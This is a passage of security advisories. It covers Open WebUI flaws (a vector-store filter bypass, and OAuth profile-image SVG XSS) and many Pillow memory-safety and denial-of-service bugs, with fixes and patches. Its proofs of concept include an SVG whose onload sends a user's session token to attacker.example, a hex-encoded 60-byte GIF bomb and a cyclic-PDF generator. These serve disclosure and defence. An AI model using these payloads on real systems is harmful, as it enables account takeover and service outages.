Document text lives in separate per-knowledge-base collections reached by a different call that is scoped by collection rather than by this filter, so stored documents are not returned by this path, and no write access is gained. Because the default backend is unaffected, the population at risk is operators who deliberately moved to an external vector store, which in practice means larger deployments.  ## Fix Fixed in 0.11.1 by 1d6d4e6e6. Every affected backend now applies the caller-supplied filter in its search method, combined with the collection or tenant scoping that method already performed. Where a backend's filter builder could express only single-value equality it was extended to express set membership, since that is the form the knowledge tool sends, and a filter using any other operator is now rejected rather than dropped. Upgrading is sufficient and no configuration change is required. Deployments on Chroma, pgvector, MariaDB or Valkey were never affected and need no action.  ## Root cause - The search method of each affected vector client, which declares a filter parameter and never references it. - The built-in knowledge search tool, which relies on that filter as its only access check. - Present from 0.7.0, the release that introduced the tool, through 0.11.0.  Each client exposes a search method and a query method that appear interchangeable from the calling side and differ in whether the caller's filter survives. Search built its request with collection or tenant scoping only, so it was correctly scoped to the collection and entirely unscoped within it. The knowledge tool resolves the caller's readable knowledge bases correctly and passes them down, then reads the results without rechecking them, on the reasonable assumption that a filter handed to a vector store is applied. Because the access decision was delegated wholly to a parameter that most implementations discarded, the caller had no way to observe that it received more than it asked for.  That the same omission repeated across most backends points at the shared interface rather than at any one client: the base class defines the parameter without obliging an implementation to honour it, and each backend was written against the interface independently.  ## Proof of concept Run against the shipped client classes taken from the 0.11.0 and 0.11.3 release tags, with a real Qdrant engine behind them. Two entries were inserted into the shared knowledge base collection, one readable and one not, mirroring the payload the application writes. The entries were inserted directly rather than created through the application.  On 0.11.0, search given a filter naming only the readable knowledge base returned both, and the same call with no filter returned an identical result set, confirming the filter had no effect:  ``` search(filter={'knowledge_base_id': {'$in': ['kb-allowed']}})  ->  ['kb-allowed', 'kb-secret'] search(filter=None)                                            ->  ['kb-allowed', 'kb-secret'] ```  On 0.11.3 the same filter returned only the readable entry, while the unfiltered control still returned both, confirming the collection held both and the filter is what excluded the second:  ``` search(filter={'knowledge_base_id': {'$in': ['kb-allowed']}})  ->  ['kb-allowed'] search(filter=None)                                            ->  ['kb-allowed', 'kb-secret'] ```  The Chroma client, run the same way on both tags, returned only the readable entry in every case, which is the default backend being unaffected. The S3 Vectors client was additionally run against a stub that answers every query with the whole index regardless of the filter it is sent: on 0.11.0 it returned both entries, and on 0.11.3 it returned only the readable one.  The remaining backends were checked by driving each patched filter builder with the exact filter the knowledge tool sends and confirming the request it produces restricts to the readable knowledge base.  ## Credits Reported by @Classic298.

# Summary  When a user signs in via OAuth, Open WebUI fetches the `picture` claim URL, infers a MIME type from the URL extension via `mimetypes.guess_type`, and stores `data:<mime>;base64,...` as the user's profile image. The OAuth code path does not go through the `validate_profile_image_url` Pydantic validator that normally restricts profile images to PNG/JPEG/GIF/WebP. A `.svg` URL in the `picture` claim lands in the database as `data:image/svg+xml;base64,...`.  The profile image endpoint `GET /api/v1/users/{id}/profile/image` returns the stored data URI with the attacker-controlled MIME type as `Content-Type` and `Content-Disposition: inline`. Security headers (CSP, `X-Content-Type-Options`) are env-gated and not set by default. An authenticated user navigating directly to that URL gets the SVG as a top-level document, executing `<script>`/`onload` in the same origin and able to read `localStorage.token` → account takeover.  Same class of trust-boundary error as CVE-2025-64496 (trust of untrusted model servers) and CVE-2025-64495 (rich-text XSS). Different sink, different code path.  # Details  ## 1. MIME inferred from URL extension, not Content-Type  `backend/open_webui/utils/oauth.py:1336-1345` — `_process_picture_url`:  ```python response = await client.get(picture_url, ...) if response.status_code == 200:     picture = response.content     base64_encoded_picture = base64.b64encode(picture).decode("utf-8")     guessed_mime_type = mimetypes.guess_type(picture_url)[0]     if guessed_mime_type is None:         guessed_mime_type = "image/jpeg"     return f"data:{guessed_mime_type};base64,{base64_encoded_picture}" ```  No MIME allowlist. The upstream `Content-Type` is ignored. For a URL ending in `.svg`, `mimetypes.guess_type` returns `image/svg+xml`.  ## 2. OAuth path bypasses the profile-image validator  `backend/open_webui/utils/validate.py:10-36` defines `validate_profile_image_url`, which only accepts `/user.png`, `/user-mono.png`, and `data:image/{png,jpeg,gif,webp};base64,...`.  This validator is wired into Pydantic form models (`SignupForm`, `UpdateProfileForm`, `UserUpdateForm`), but the OAuth flow at `oauth.py:1536-1540` (existing-user login) and `oauth.py:1556-1574` (new-user signup) writes via `Users.update_user_profile_image_url_by_id` and `Auths.insert_new_auth`, both of which call SQLAlchemy directly (`models/users.py:575-588`) without going through any Pydantic model. The SVG data URI lands in the DB unchallenged.  ## 3. Endpoint serves attacker-controlled MIME with `inline` disposition  `backend/open_webui/routers/users.py:504-528` — `get_user_profile_image_by_id`:  ```python header, encoded = image.split(",", 1) media_type = header.split(";")[0].lstrip("data:")  # "image/svg+xml" data = base64.b64decode(encoded) return StreamingResponse(     iter([data]),     media_type=media_type,     headers={"Content-Disposition": "inline"}, ) ```  No MIME whitelist. The route requires `get_verified_user` — any authenticated user reaches it.  ## 4. No default CSP / nosniff  `backend/open_webui/utils/security_headers.py:16-61` populates headers only when the operator sets the corresponding env var. The default deployment returns none of these. Browsers render a top-level `image/svg+xml` response as an XML document and execute embedded script.  # PoC  **Prerequisites**: operator has OAuth signup enabled (`ENABLE_OAUTH_SIGNUP=true`) or OAuth login with picture sync (`OAUTH_UPDATE_PICTURE_ON_LOGIN=true`). The attacker has a valid identity on the configured IdP and can set their profile picture URL.  1. Attacker hosts a malicious SVG at `https://attacker.example/p.svg`:  ```xml <svg xmlns="http://www.w3.org/2000/svg"      onload="fetch('https://attacker.example/x?c='+encodeURIComponent(localStorage.getItem('token')))" /> ```  2. Attacker sets their IdP profile picture to that URL and signs in to Open WebUI via OAuth. Signup (or login with picture sync) stores `data:image/svg+xml;base64,...` in the attacker's `profile_image_url`.  3. Attacker shares a link to their own profile image with a victim in a chat DM or channel:  ``` https://target.example/api/v1/users/<attacker-user-id>/profile/image ```  4. The authenticated victim clicks the link. The browser receives `Content-Type: image/svg+xml` with `Content-Disposition: inline`, renders the SVG as a top-level document, fires `onload`, and exfiltrates the victim's JWT. Attacker uses the JWT to take over the victim's account.  # Impact  - Account takeover of any authenticated user who opens the crafted URL. - Post-takeover: access to the victim's chats, API keys stored in their settings, and — if the victim has `workspace.tools` permission — RCE via installed tools (per CVE-2025-64496 analysis). - The same `_process_picture_url` function has no SSRF allowlist; a secondary primitive is to point the `picture` claim at an internal URL (metadata service, internal admin panel) and read the response bytes via the profile image endpoint.  # Suggested fix  1. In `_process_picture_url` (`utils/oauth.py:1336-1345`): reject any MIME outside `{image/png, image/jpeg, image/gif, image/webp}`. Use the upstream `Content-Type` response header, not the URL extension. Also add an SSRF allowlist or at minimum block RFC1918 / link-local / loopback targets.  2. In `get_user_profile_image_by_id` (`routers/users.py:504-528`): enforce a MIME whitelist before building `StreamingResponse`. This is the defense-in-depth layer that should have caught the bypass.  3. Apply `validate_profile_image_url` at the model/storage layer (`Users.update_user_profile_image_url_by_id`), not only at the Pydantic form layer. All write paths to the profile image column should go through the same validator.  4. Set `X-Content-Type-Options: nosniff` and a default CSP unless the operator explicitly disables them.  # References  - `backend/open_webui/utils/oauth.py:1318-1351` — MIME guess + fetch - `backend/open_webui/utils/oauth.py:1536-1574` — OAuth write path - `backend/open_webui/utils/validate.py:10-36` — validator (bypassed) - `backend/open_webui/models/users.py:575-588` — DB write - `backend/open_webui/routers/users.py:504-528` — serving endpoint - `backend/open_webui/utils/security_headers.py:16-61` — env-gated headers - CVE-2025-64496 — precedent: trust boundary error (same class) - CVE-2025-64495 — precedent: rich-text XSS (same class)

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's P;2L and P;4L raw decoders can read past the end of an input buffer. ImagingRawDecode calculates a packed-pixel row size, while the unpackers read separately padded bit planes. A caller can supply a buffer and image dimensions whose accepted size is smaller than the unpacker's actual footprint. This can disclose up to three adjacent heap bytes in output pixels or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.3.0 until 13.0.0, Pillow has a heap use-after-free when libtiff rejects a tag while encoding TIFF data to an in-memory buffer. When an application saves attacker-influenced TIFF tags to BytesIO, libtiff can reject a tag during encoding in ImagingLibTiffEncode; the error path then frees the output buffer without closing or clearing the TIFF handle, and later cleanup flushes through the write callback into freed memory, which can crash the process and may enable code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, PILfont text-width accumulation in src/_imaging.c checks positive glyph advances against INT_MAX but does not check negative advances against INT_MIN. Repeating a signed 16-bit advance of -32768 can therefore execute a signed C integer overflow in xsize += dx, producing a large positive width from a negative mathematical result. Applications that use getlength(), getsize(), or derived layout, quota, serialization, or allocation calculations can experience logic-integrity errors or resource consumption, while the high-level mask path commonly retains a decompression-bomb check. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, MpoImageFile.seek() and DcxImageFile.seek() reparse later MPO or DCX frames and replace self._size without rerunning Image._decompression_bomb_check(). A crafted multi-frame image can use a tiny first frame to pass Image.open() and then declare an over-limit later frame. Normal frame iteration through seek(), load(), or ImageSequence.Iterator can decode that frame and commit hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's XBM header parser is vulnerable to regular-expression denial of service. In XbmImageFile._open, when an application calls Image.open() on a small crafted XBM file, XbmImagePlugin applies a backtracking expression to the attacker-controlled header before image dimensions are accepted, stalling a worker for minutes and denying service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.2.1 until 13.0.0, Arrow export assumes that an image's rows are tightly contiguous and exports from im->blocks[0].ptr even when PILLOW_ALIGNMENT makes aligned_linesize include row padding or an aligned offset before the first row. The resulting Arrow buffer can include uninitialized padding, bytes preceding the first row, or stale heap contents from previously freed images. Applications that configure alignment and export images to Arrow can therefore disclose one user's pixels or other process memory to another user. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 12.0.0 until 13.0.0, Pillow's Image.merge() can dereference a null image8 plane. Validation skips the first input band, allowing a 32-bit integer or floating-point image backed by image32 storage to be merged as a narrower multiband image. A crafted IPTC file can reach this path when an application opens and loads it, or a caller can invoke Image.merge() directly with such a first band. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

### Summary When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.  ### Details `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:  - `src/PIL/PdfParser.py:1078-1092`  `read_prev_trailer` catches only a repeated offset:  - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)  ### PoC ```python from PIL import PdfParser  # A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2). objs = {     1: b"<< /Type /Catalog /Pages 2 0 R >>",     2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",     3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>", } buf = bytearray(b"%PDF-1.4
") off = {} for oid in (1, 2, 3):     off[oid] = len(buf)     buf += b"%d 0 obj
" % oid + objs[oid] + b"
endobj
" xref = len(buf) buf += b"xref
0 4
0000000000 65535 f 
" buf += b"".join(b"%010d 00000 n 
" % off[o] for o in (1, 2, 3)) buf += b"trailer
<< /Root 1 0 R /Size 4 >>
startxref
%d
%%%%EOF
" % xref open("poc.pdf", "wb").write(buf)  PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way ```  Run it: ``` $ python 11_poc.py RecursionError: maximum recursion depth exceeded ```  The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.  ### Impact A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

``` ============================================================================ GIF seek keeps rejected size after DecompressionBombError, allowing DoS Location: src/PIL/GifImagePlugin.py:293 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A GIF of about 60 bytes can make Pillow allocate gigabytes of memory. This affects applications that catch the "image too large" error raised while stepping to a later animation frame and then keep using the same image object. Pillow correctly refuses the oversized frame, but it stores the refused dimensions on the image object anyway, and later operations size their memory from them. An attacker who can upload a GIF to such a service can exhaust its memory: the process either fails with an out-of-memory error after committing gigabytes, or is killed by the operating system. There is no memory corruption. The bug is in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`). When a frame's extent enlarges the image, the code assigns the new size to `self._size` and only then calls `Image._decompression_bomb_check()`. Nothing restores the old size when `DecompressionBombError` is raised, because `seek()` only rolls back on `EOFError`. After the caught error, `im.size` reports the rejected size while the pixel buffer `im.im` is still the 1×1 first frame. Because the extent is a 16-bit offset plus a 16-bit size, that rejected size can be as large as 131070×131070. In the attached reproducer, the rejected size is 40000×40000. A retried `seek(1)` followed by `load()` then reaches `load_prepare()`, which calls `Image.core.fill()` with that size to decode a single pixel. Peak memory rises from 17 MiB to 1700 MiB before a 3 GiB address-space cap stops the next allocation. `Image.new("RGB", im.size, ...)` and `rotate(..., expand=True)` also allocate from the stale size. The default paths are unaffected: plain `Image.open()` plus `load()`, `ImageSequence.Iterator`, and `n_frames`/`is_animated`. The ordering was introduced in c9f1b35e9810 ("Added GIF decompression bomb check", 2022-06-30, first released in 9.2.0), the check added for CVE-2022-45198. The two dispose-extent checks later in the same function already validate before using the size, and the attached patch makes this check follow the same order. ## Details `GifImageFile._seek()` lets a later frame enlarge the image, and performs the decompression-bomb check for the new size only *after* storing it on the object: ```python # src/PIL/GifImagePlugin.py:289-294 (GifImageFile._seek) x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: self._size = max(x1, self.size[0]), max(y1, self.size[1]) # state mutated Image._decompression_bomb_check(self._size) # ...then validated ``` `_decompression_bomb_check()` (`src/PIL/Image.py:3586`) raises `DecompressionBombError` for anything above `2 * MAX_IMAGE_PIXELS` (178 956 970 px by default), but by then `self._size` already holds the rejected value and nothing restores it: `seek()` (`GifImagePlugin.py:166-179`) only rolls back on `EOFError`, and `_seek(0)` only ever grows `_size`. The object that the application still holds therefore reports `im.size == (40000, 40000)` while `im.im` is the 1×1 buffer of frame 0. Compare the two dispose-extent checks a few lines further down in the same function (`GifImagePlugin.py:383` and `:407`), which call `_decompression_bomb_check(dispose_size)` *before* the corresponding `Image.core.fill()`, and `TiffImagePlugin.load_prepare()` (`src/PIL/TiffImagePlugin.py:1319-1321`), which checks `_tile_size` before allocating from it. With this 60-byte GIF (hex) ``` 47494638396101000100800000000000ffffff GIF89a, 1x1 screen, 2-entry global palette 2c000000000100010000 02 024401 00 frame 0: 1x1 @ (0,0), LZW data 2c00000000409c409c00 frame 1 descriptor: 40000x40000 @ (0,0) 2c000000000100010000 02 024401 00 another 1x1 frame 3b trailer ``` `Image.open()` succeeds (`im.size == (1, 1)`), `im.seek(1)` raises `DecompressionBombError: Image size (1600000000 pixels) exceeds limit of 178956970 pixels`, and afterwards `im.size == (40000, 40000)`, `im.im.size == (1, 1)`, `im.tell() == 0`. What happens next depends on what the application does with the object, but several ordinary operations take their dimensions from `im.size` rather than from the C buffer: - Retrying `im.seek(1)`. The failed `_seek` left `self.__offset == 0` and the file pointer just past the 9-byte descriptor, so the retry parses whatever follows — in the file above, a valid 1×1 frame — and succeeds. `im.load()` then runs `GifImageFile.load_prepare()`: ```python # src/PIL/GifImagePlugin.py:452-456 elif self.mode in ("RGB", "RGBA"): self._prev_im = self.im if self._frame_palette: self.im = Image.core.fill("P", self.size, self._frame_transparency or 0) ``` which allocates and `memset`s a 40000×40000 "P" image (1.6 GB) to decode a 1×1 tile into, and `load_end()` (`GifImagePlugin.py:485-491`) fills a second one and converts it to RGB (another 1.6 GB + 6.4 GB). - `im.rotate(angle, expand=True)` for a non-multiple-of-90 angle, or the common flatten-onto-background idiom `Image.new("RGB", im.size, bg)`, allocate from `im.size` as well (measured on an object poisoned to 20000×20000: `rotate(45, expand=True)` completes and touches 776 MiB; `Image.new("RGB", im.size, "white")` touches 1.5 GiB). Operations that pass `im.size` as a box against the real buffer (`thumbnail`, `resize`, `save`) fail with `ValueError`/`SystemError` instead. The extent fields are 16-bit offset plus 16-bit size, so the stored size can be pushed to 131070×131070 (17.2 Gpx; 17 GB for mode "P", 69 GB for "RGB"/"RGBA" storage), 96× the error threshold. `n_frames` / `is_animated` are not affected: they call `_seek(frame, update_image=False)`, which skips the `_size` assignment (the file above reports `n_frames == 2`, `is_animated == True` and leaves `im.size` at 1×1). ## Impact A remote user who can upload a GIF to a service that (a) seeks animation frames and (b) catches the exception from `seek()` — a broad `except Exception` around a `while True: im.seek(im.tell()+1)` frame-collection loop, or an explicit `except DecompressionBombError: log and continue` — and then keeps using the same `Image` object, ends up driving allocations of 1.6 GB to tens of GB from a 60-byte file: `MemoryError` after the process has committed gigabytes, or an OOM kill of the worker when no address-space limit is set. The `MAX_IMAGE_PIXELS` guard fires, but does not actually keep the rejected dimensions out of the object it is guarding. The precondition is real application behaviour but not the default path: `Image.open(); im.load()` is unaffected, and `ImageSequence.Iterator` propagates the error out of the `for` statement (a `try` inside the loop body does not swallow it). Hence low severity. This is adjacent to the GIF extent bomb check added for CVE-2022-45198: the ordering was introduced with that check in `c9f1b35e9810` ("Added GIF decompression bomb check", 2022-06-30), first released in Pillow 9.2.0. Before it, the same size growth happened with no check at all; the check introduced there is the one that runs too late. ## Reproducing `repro` is a single Python script run against the installed Pillow. It needs about 1.7 GB of free RAM. 1. **`setup_env()`** caps the process address space at 3 GiB with `RLIMIT_AS`, so the oversized allocations end in `MemoryError` instead of the OOM killer. It then opens the 60-byte GIF shown above, built in memory by `bomb_gif()`. The GIF contains a 1×1 screen and a 1×1 frame 0, so `Image.open()` passes its own bomb check. Next comes a bare frame-1 image descriptor that declares 40000×40000 (1.6 Gpx, about 9× the error threshold). A real 1×1 frame follows it. 2. **`poc()`** calls `im.seek(1)` and catches `DecompressionBombError`, the way an application that skips bad frames would. 3. **First check: the state is inconsistent.** The script prints `im.size` next to the real pixel buffer `im.im.size`. If the rejected frame had left the object unchanged, both would be `(1, 1)`. On the affected code `im.size` is `(40000, 40000)`. 4. **Second check: memory use.** The script retries `im.seek(1)`, which now parses the trailing 1×1 frame, and calls `im.load()`. It prints the process's peak RSS before and after. `load_prepare()` sizes its `Image.core.fill()` from `im.size`, so loading a single pixel fills a 1.6 GB buffer before the 3 GiB cap stops the next allocation. Expected output on the affected tree: ``` open(): 60-byte GIF, size=(1, 1) seek(1) raised as intended: Image size (1600000000 pixels) exceeds limit of 178956970 pixels, could be decompression bomb DOS attack. after the caught error: im.size=(40000, 40000), pixel buffer im.im.size=(1, 1) seek(1) + load() of a 1x1 frame: MemoryError at the 3 GiB cap; peak RSS 18 MiB -> 1700 MiB BUG ``` The script prints `BUG` only if both checks hold: the over-limit size stayed on the object after the exception, and peak RSS grew by more than 1000 MiB while loading a 1×1 frame. Otherwise it prints `OK`. With the attached patch applied, it prints `im.size=(1, 1)`, peak RSS stays at about 23 MiB, and the last line is `OK`. ## Suggested fix The attached patch validates before mutating in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`): the enlarged extent is computed into a local, passed to `_decompression_bomb_check()`, and only then assigned to `self._size`, matching the order of the two `dispose_size` checks further down the same function. A rejected frame therefore leaves the object in its pre-seek state; valid files behave as before, and the exception is still raised at the same point: ```diff --- a/src/PIL/GifImagePlugin.py +++ b/src/PIL/GifImagePlugin.py @@ -290,8 +290,9 @@ class GifImageFile(ImageFile.ImageFile): x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: - self._size = max(x1, self.size[0]), max(y1, self.size[1]) - Image._decompression_bomb_check(self._size) + size = max(x1, self.size[0]), max(y1, self.size[1]) + Image._decompression_bomb_check(size) + self._size = size frame_dispose_extent = x0, y0, x1, y1 flags = s[8] ``` `n_frames` / `is_animated` go through `update_image=False` and are unaffected. The patch also extends `test_exception_gif_extents` in `Tests/test_decompression_bomb.py` to assert that `im.size` is unchanged after the `DecompressionBombError`. It does not change `seek()` itself; optionally, `seek()` could also treat `DecompressionBombError` like `EOFError` and re-seek to `last_frame`, so that a retried `seek()` does not resume parsing from the middle of the rejected frame. ## The patch GIF: run the decompression bomb check on an enlarging frame's extent before storing it in self._size Applies to `src/PIL/GifImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_decompression_bomb.py b/Tests/test_decompression_bomb.py index 98d833736..83cc785fc 100644 --- a/Tests/test_decompression_bomb.py +++ b/Tests/test_decompression_bomb.py @@ -63,6 +63,9 @@ class TestDecompressionBomb: with pytest.raises(Image.DecompressionBombError): im.seek(1) + # The rejected frame should not have changed the image size + assert im.size == (100, 100) + def test_exception_gif_zero_width(self, monkeypatch: pytest.MonkeyPatch) -> None: # Set limit to trigger exception on the test file monkeypatch.setattr(Image, "MAX_IMAGE_PIXELS", 4 * 64 * 128) diff --git a/src/PIL/GifImagePlugin.py b/src/PIL/GifImagePlugin.py index 11fb180fc..f9bda06c2 100644 --- a/src/PIL/GifImagePlugin.py +++ b/src/PIL/GifImagePlugin.py @@ -290,8 +290,9 @@ class GifImageFile(ImageFile.ImageFile): x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: - self._size = max(x1, self.size[0]), max(y1, self.size[1]) - Image._decompression_bomb_check(self._size) + size = max(x1, self.size[0]), max(y1, self.size[1]) + Image._decompression_bomb_check(size) + self._size = size frame_dispose_extent = x0, y0, x1, y1 flags = s[8] ``` ## The reproducer
Reproducer — repro, 2,474 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # GifImageFile._seek() stores a frame's enlarged size in self._size and only # *then* runs the decompression-bomb check. ``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` 